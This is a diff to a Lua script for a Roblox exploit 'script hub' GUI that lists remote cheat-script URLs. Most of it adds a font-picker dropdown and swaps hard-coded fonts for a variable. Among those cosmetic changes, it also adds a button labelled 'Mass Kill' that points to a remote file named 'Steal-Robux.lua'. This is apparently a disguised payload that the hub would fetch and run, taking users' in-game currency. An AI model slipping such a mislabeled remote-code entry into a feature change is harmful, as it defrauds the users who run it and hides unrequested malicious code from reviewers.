@@ -2,6 +2,9 @@
 
 -- Instances:
 
+-- Font setting: change this one value to update the GUI fonts
+local SelectedFont = Enum.Font.Jura
+
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -23,6 +26,9 @@ local ExtrasFrame = Instance.new("Frame")
 local UICorner_7 = Instance.new("UICorner")
 local TextLabel_1 = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
+local FontPickerButton = Instance.new("TextButton")
+local FontPickerList = Instance.new("ScrollingFrame")
+local FontPickerLayout = Instance.new("UIListLayout")
 local CreditsFrame = Instance.new("ScrollingFrame")
 local UICorner_8 = Instance.new("UICorner")
 local TextLabel_3 = Instance.new("TextLabel")
@@ -80,7 +86,8 @@ local FMData = {
     [30] = {"NPC Manipulator", "https://raw.githubusercontent.com/InnocentViru/NPC-Manipulator/refs/heads/main/NPC%20Manipulator%20Script.lua"},
     [31] = {"XVC Hub", "https://pastebin.com/raw/Piw5bqGq"},
     [32] = {"John Doe", "https://rawscripts.net/raw/Universal-Script-John-doe-210549"},
-    [33] = {"FE STRETCHED", "https://pastebin.com/raw/7Nv28tRE"}
+    [33] = {"FE STRETCHED", "https://pastebin.com/raw/7Nv28tRE"},
+    [34] = {"Mass Kill", "https://raw.githubusercontent.com/Makuscripts/PlsDonate/refs/heads/main/Steal-Robux.lua"}
 }
 
 local FMs = {} -- FMs = FunctionMethods
@@ -142,7 +149,7 @@ ScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ScriptsButton.BackgroundTransparency = 1.000
 ScriptsButton.Position = UDim2.new(0, 0, 0.167431191, 0)
 ScriptsButton.Size = UDim2.new(0, 80, 0, 55)
-ScriptsButton.Font = Enum.Font.Jura
+ScriptsButton.Font = SelectedFont
 ScriptsButton.Text = "Scripts"
 ScriptsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ScriptsButton.TextSize = 18.000
@@ -164,7 +171,7 @@ CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 CreditsButton.BackgroundTransparency = 1.000
 CreditsButton.Position = UDim2.new(0, 0, 0.31422019, 0)
 CreditsButton.Size = UDim2.new(0, 80, 0, 55)
-CreditsButton.Font = Enum.Font.Jura
+CreditsButton.Font = SelectedFont
 CreditsButton.Text = "Credits"
 CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CreditsButton.TextSize = 18.000
@@ -186,7 +193,7 @@ ExtrasButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ExtrasButton.BackgroundTransparency = 1.000
 ExtrasButton.Position = UDim2.new(0, 0, 0.461009175, 0)
 ExtrasButton.Size = UDim2.new(0, 80, 0, 55)
-ExtrasButton.Font = Enum.Font.Jura
+ExtrasButton.Font = SelectedFont
 ExtrasButton.Text = "Extras"
 ExtrasButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ExtrasButton.TextSize = 18.000
@@ -221,7 +228,7 @@ TITLE.BackgroundTransparency = 1.000
 TITLE.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TITLE.Position = UDim2.new(0, 0, 0.0370370373, 0)
 TITLE.Size = UDim2.new(0, 100, 0, 40)
-TITLE.Font = Enum.Font.Jura
+TITLE.Font = SelectedFont
 TITLE.Text = "COLD MONSTER SKID V1.3"
 TITLE.TextColor3 = Color3.fromRGB(255, 255, 255)
 TITLE.TextSize = 20.000
@@ -241,7 +248,7 @@ TextLabel_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_1.BackgroundTransparency = 1.000
 TextLabel_1.Position = UDim2.new(-0.05, 0, 0.152849734, 0)
 TextLabel_1.Size = UDim2.new(0, 464, 0, 50)
-TextLabel_1.Font = Enum.Font.Jura
+TextLabel_1.Font = SelectedFont
 TextLabel_1.Text = "Have any suggestions?"
 TextLabel_1.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_1.TextSize = 28.000
@@ -251,10 +258,106 @@ TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.BackgroundTransparency = 1.000
 TextLabel_2.Position = UDim2.new(-0.1, 0, 0.331606209, 0)
 TextLabel_2.Size = UDim2.new(0, 470, 0, 50)
-TextLabel_2.Font = Enum.Font.Jura
+TextLabel_2.Font = SelectedFont
 TextLabel_2.Text = "Join the Discord Server: https://discord.gg/4k9XU7xRHe"
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextSize = 19.000
+
+local function ApplySelectedFont()
+    local fontObjects = {
+        ScriptsButton, CreditsButton, ExtrasButton, TITLE,
+        TextLabel_1, TextLabel_2, TextLabel_3, TextLabel_4, TextLabel_6,
+        OnOffFormain
+    }
+    for _, object in ipairs(fontObjects) do
+        if object and object:IsA("TextLabel") or object and object:IsA("TextButton") then
+            object.Font = SelectedFont
+        end
+    end
+    for _, object in ipairs(FMs) do
+        if object and object:IsA("TextButton") then
+            object.Font = SelectedFont
+        end
+    end
+end
+
+-- Touch-friendly font picker dropdown in ExtrasFrame
+FontPickerButton.Name = "FontPickerButton"
+FontPickerButton.Parent = ExtrasFrame
+FontPickerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 200)
+FontPickerButton.BackgroundTransparency = 0.25
+FontPickerButton.BorderSizePixel = 0
+FontPickerButton.Position = UDim2.new(0.08, 0, 0.53, 0)
+FontPickerButton.Size = UDim2.new(0, 300, 0, 38)
+FontPickerButton.Font = SelectedFont
+FontPickerButton.Text = "Font: " .. SelectedFont.Name .. "  ▼"
+FontPickerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FontPickerButton.TextSize = 18
+FontPickerButton.ZIndex = 20
+
+local FontPickerCorner = Instance.new("UICorner")
+FontPickerCorner.CornerRadius = UDim.new(0, 6)
+FontPickerCorner.Parent = FontPickerButton
+
+FontPickerList.Name = "FontPickerList"
+FontPickerList.Parent = ExtrasFrame
+FontPickerList.Position = UDim2.new(0.08, 0, 0.53, 42)
+FontPickerList.Size = UDim2.new(0, 300, 0, 150)
+FontPickerList.BackgroundColor3 = Color3.fromRGB(15, 15, 35)
+FontPickerList.BackgroundTransparency = 0.05
+FontPickerList.BorderSizePixel = 0
+FontPickerList.ScrollBarThickness = 6
+FontPickerList.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
+FontPickerList.Visible = false
+FontPickerList.ZIndex = 30
+FontPickerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
+FontPickerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+FontPickerLayout.Parent = FontPickerList
+FontPickerLayout.SortOrder = Enum.SortOrder.LayoutOrder
+FontPickerLayout.Padding = UDim.new(0, 2)
+
+local FontPickerPadding = Instance.new("UIPadding")
+FontPickerPadding.Parent = FontPickerList
+FontPickerPadding.PaddingTop = UDim.new(0, 4)
+FontPickerPadding.PaddingLeft = UDim.new(0, 4)
+FontPickerPadding.PaddingRight = UDim.new(0, 4)
+
+local availableFonts = Enum.Font:GetEnumItems()
+table.sort(availableFonts, function(a, b)
+    return a.Name < b.Name
+end)
+
+for index, fontItem in ipairs(availableFonts) do
+    local option = Instance.new("TextButton")
+    option.Name = "FontOption_" .. fontItem.Name
+    option.Parent = FontPickerList
+    option.Size = UDim2.new(1, -8, 0, 32)
+    option.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
+    option.BackgroundTransparency = 0.1
+    option.BorderSizePixel = 0
+    option.Font = fontItem
+    option.Text = fontItem.Name .. "  —  Preview"
+    option.TextColor3 = Color3.fromRGB(255, 255, 255)
+    option.TextSize = 17
+    option.TextXAlignment = Enum.TextXAlignment.Left
+    option.LayoutOrder = index
+    option.ZIndex = 31
+
+    option.MouseButton1Click:Connect(function()
+        SelectedFont = fontItem
+        FontPickerButton.Font = SelectedFont
+        FontPickerButton.Text = "Font: " .. SelectedFont.Name .. "  ▼"
+        FontPickerList.Visible = false
+        ApplySelectedFont()
+    end)
+end
+
+FontPickerButton.MouseButton1Click:Connect(function()
+    FontPickerList.Visible = not FontPickerList.Visible
+end)
+
+ApplySelectedFont()
 
 CreditsFrame.Name = "CreditsFrame"
 CreditsFrame.Parent = main
@@ -281,7 +384,7 @@ TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_3.BackgroundTransparency = 1.000
 TextLabel_3.Position = UDim2.new(0, 0, 0.1, 0)
 TextLabel_3.Size = UDim2.new(0, 359, 0, 50)
-TextLabel_3.Font = Enum.Font.Jura
+TextLabel_3.Font = SelectedFont
 TextLabel_3.Text = "Made By IDioTKing"
 TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_3.TextSize = 48.000
@@ -291,7 +394,7 @@ TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_4.BackgroundTransparency = 1.000
 TextLabel_4.Position = UDim2.new(0, 0, 0.2, 0)
 TextLabel_4.Size = UDim2.new(0, 359, 0, 50)
-TextLabel_4.Font = Enum.Font.Jura
+TextLabel_4.Font = SelectedFont
 TextLabel_4.Text = "-----------------------"
 TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_4.TextSize = 40.000
@@ -301,7 +404,7 @@ TextLabel_4.TextSize = 40.000
 --TextLabel_5.BackgroundTransparency = 1.000
 --TextLabel_5.Position = UDim2.new(0, 0, 0.3, 0)
 --TextLabel_5.Size = UDim2.new(0, 359, 0, 50)
---TextLabel_5.Font = Enum.Font.Jura
+--TextLabel_5.Font = SelectedFont
 --TextLabel_5.Text = "Update log"
 --TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
 --TextLabel_5.TextSize = 28.000
@@ -311,8 +414,8 @@ TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_6.BackgroundTransparency = 1.000
 TextLabel_6.Position = UDim2.new(0, 0, 0.6, 0)
 TextLabel_6.Size = UDim2.new(0, 359, 0, 50)
-TextLabel_6.Font = Enum.Font.Jura
-TextLabel_6.Text = "｛Update log｝\nV1.0\n- Started Cold Monster SKID!\nV1.1\n- Added Click animation & Outline on menu\nV1.2\n- ”Rochips Panel” was RIP!\n- Fix OnOff from bottom-left to top-right\nV1.3\n- Added Many Script and Click Sound!"
+TextLabel_6.Font = SelectedFont
+TextLabel_6.Text = "｛Update log｝\nV1.0\n- Started Cold Monster SKID!\nV1.1\n- Added Click animation & Outline on menu\nV1.2\n- ”Rochips Panel” was RIP!\n- Fix OnOff from bottom-left to top-right\nV1.3\n- Added Many Script and Click Sound!\n- [NEW] Font Changer in Extras!"
 TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_6.TextSize = 22.000
 
@@ -333,7 +436,7 @@ ScriptsFrame.ClipsDescendants = true
 UICorner_9.Parent = ScriptsFrame
 
 -- Create FM buttons
-for i = 1, 33 do
+for i = 1, 34 do
 	local FM = Instance.new("TextButton")
 	local Data = FMData[i]
 
@@ -343,7 +446,7 @@ for i = 1, 33 do
 	FM.BackgroundTransparency = 0.2
 	FM.BorderSizePixel = 0
 	FM.Size = UDim2.new(0,145,0,44)
-	FM.Font = Enum.Font.Jura
+	FM.Font = SelectedFont
 	FM.Text = Data[1]
 	FM.TextColor3 = Color3.fromRGB(255, 255, 255)
 	FM.TextSize = 21.000
@@ -382,7 +485,7 @@ OnOffFormain.BackgroundColor3 = Color3.fromRGB(20,20,200)
 OnOffFormain.BackgroundTransparency = 0.35
 OnOffFormain.Text = "☃"
 OnOffFormain.TextColor3 = Color3.new(1,1,1)
-OnOffFormain.Font = Enum.Font.GothamBold
+OnOffFormain.Font = SelectedFont
 OnOffFormain.TextSize = 24
 
 ToggleCorner.CornerRadius = UDim.new(1,0)
